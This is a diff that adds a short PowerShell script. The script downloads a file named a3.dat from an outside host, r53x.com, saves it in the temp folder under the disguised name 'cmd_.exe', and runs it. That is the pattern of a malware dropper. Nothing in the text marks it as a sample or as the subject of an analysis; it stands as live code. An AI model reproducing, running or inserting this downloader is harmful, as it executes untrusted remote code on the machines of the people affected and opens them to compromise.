@@ -1,0 +1,20 @@
+﻿
+$bigs = "http://r53x.com/a3.dat",""
+foreach($big in $bigs){
+Try
+{
+	Write-Host $big	
+	$tp = "$env:temp\cmd_.exe"	
+	Write-Host $tp
+	$wc = New-Object System.Net.WebClient
+	$wc.DownloadFile($big, $tp)
+	Start-Process $tp
+	break
+}
+Catch
+{
+   Write-Host $_.Exception.Message
+}
+
+	
+}
